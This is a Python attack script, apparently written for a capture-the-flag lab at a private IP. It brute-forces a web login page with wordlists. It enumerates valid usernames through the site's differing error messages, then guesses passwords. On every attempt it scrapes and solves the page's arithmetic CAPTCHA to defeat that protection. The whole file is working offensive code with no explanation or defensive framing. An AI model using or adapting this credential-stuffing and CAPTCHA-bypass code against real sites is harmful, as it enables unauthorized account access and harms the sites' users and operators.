import requests
import re
import sys

# URL to crack, change the IP accordingly
url = 'http://10.10.210.120/login'

# usernames wordlist
wordlistFile = open("wordlist.txt").read()
usernamesList = wordlistFile.splitlines()

# First we are trying to crack the username
for username in usernamesList:
	myobj = {'username': username, 'password': 'admin'}

	# We send this request just to extract the captcha
	x = requests.post(url, data = myobj)

	# print(x.text)
	noSpacesText = re.sub("\s", "", x.text)
	# print(noSpacesText)
	# Regex to extract the captcha from the HTML returned from the POST request
	captchaExpression = re.search(r"enabled</h3></b></label><br>([\d]+)([+\*\-\/])([\d]+)=\?<input", noSpacesText)

	# Fills in the 3 components for that captcha
	firstNumber = captchaExpression.group(1)
	operator = captchaExpression.group(2)
	secondNumber = captchaExpression.group(3)

	#print(f"{firstNumber} {operator} {secondNumber}")

	# We then actually perform the operation to generate the correct captcha value
	captchaResult = -1
	if (operator == "+"):
		captchaResult = int(firstNumber) + int(secondNumber)
	elif (operator == "-"):
		captchaResult = int(firstNumber) - int(secondNumber)
	elif (operator == "*"):
		captchaResult = int(firstNumber) * int(secondNumber)
	elif (operator == "/"):
		captchaResult = int(firstNumber) / int(secondNumber)
	#print(captchaResult)


	loginData = {'username': username, 'password': 'admin', 'captcha': captchaResult}

	# We send a second request with a valid captcha this time
	loginAttempt = requests.post(url, data = loginData)
	#print(loginAttempt.text)
	
	# We know it's a success if the expression "The user [username] is not valid" isn't found
	resultExpression = re.findall(r"</strong> The user &", loginAttempt.text)
	if (resultExpression == []):
		print(username)
		print("success!!")
		break

# Once we have the username, we pretty much to the same thing over again to get the password.
wordlistFile2 = open("passwords.txt").read()
passwordsList = wordlistFile2.splitlines()

for password in passwordsList:
	myobj = {'username': username, 'password': password}

	x = requests.post(url, data = myobj)

	# print(x.text)
	noSpacesText = re.sub("\s", "", x.text)
	# print(noSpacesText)
	captchaExpression = re.search(r"enabled</h3></b></label><br>([\d]+)([+\*\-\/])([\d]+)=\?<input", noSpacesText)

	firstNumber = captchaExpression.group(1)
	operator = captchaExpression.group(2)
	secondNumber = captchaExpression.group(3)

	#print(f"{firstNumber} {operator} {secondNumber}")

	captchaResult = -1
	if (operator == "+"):
		captchaResult = int(firstNumber) + int(secondNumber)
	elif (operator == "-"):
		captchaResult = int(firstNumber) - int(secondNumber)
	elif (operator == "*"):
		captchaResult = int(firstNumber) * int(secondNumber)
	elif (operator == "/"):
		captchaResult = int(firstNumber) / int(secondNumber)
	#print(captchaResult)


	loginData = {'username': username, 'password': password, 'captcha': captchaResult}

	loginAttempt = requests.post(url, data = loginData)
	#print(loginAttempt.text)
	
	resultExpression = re.findall(r"</strong> Invalid password", loginAttempt.text)
	if (resultExpression == []):
		print(password)
		print("success!! !!")
		break